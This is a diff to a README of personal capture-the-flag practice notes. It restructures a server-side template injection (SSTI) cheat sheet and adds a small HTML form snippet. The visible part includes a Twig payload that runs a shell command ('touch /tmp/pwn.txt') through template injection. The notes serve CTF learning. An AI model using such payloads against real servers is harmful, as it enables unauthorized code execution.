@@ -4,8 +4,21 @@ answering challenges in the practice website provided for the upcoming kyokugen 
 ![](screenshot.png)
 
 ## guide idk [WIP]
+<details>
+<summary>
+Web
+</summary>
 
-## SSTI Injection
+<details>
+    <summary>
+    SSTI Injection
+    </summary>
+
+* **`force submit idk if this is useful`:**
+    ```html
+    <form><input type="text"></input><button type="submit"></button></form>
+    ```
+
 if `{{7*7}}` works, do these
 
 1. Jinja2 (Python)
@@ -48,3 +61,7 @@ if `{{7*7}}` works, do these
     ```twig
     {{ ['touch /tmp/pwn.txt']|filter('system') }}
     ```
+
+</details>
+
+</details>
